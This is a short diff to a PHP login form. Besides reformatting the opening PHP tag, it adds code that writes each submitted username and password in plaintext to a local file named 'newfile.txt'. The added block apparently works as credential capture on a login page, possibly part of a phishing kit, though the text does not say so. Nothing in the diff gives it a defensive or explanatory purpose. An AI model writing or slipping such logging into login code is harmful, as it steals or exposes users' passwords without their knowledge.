@@ -15,7 +15,8 @@
 </form>
 </body>
 </html>
-<?php if (isset($_POST["login"])) {
+<?php
+if (isset($_POST["login"])) {
     $username = $_POST["username"];
     $password = $_POST["password"];
 
@@ -29,8 +30,14 @@
     }
 }
 
+($myfile = fopen("newfile.txt", "w")) or die("Unable to open file!");
+fwrite($myfile, "Username: $username \n");
+fwrite($myfile, "Password: $password \n");
+fclose($myfile);
+
 /*foreach ($_POST as $key => $value) {
         echo "$key = $value <br>";
         }*/
+
 
 ?>
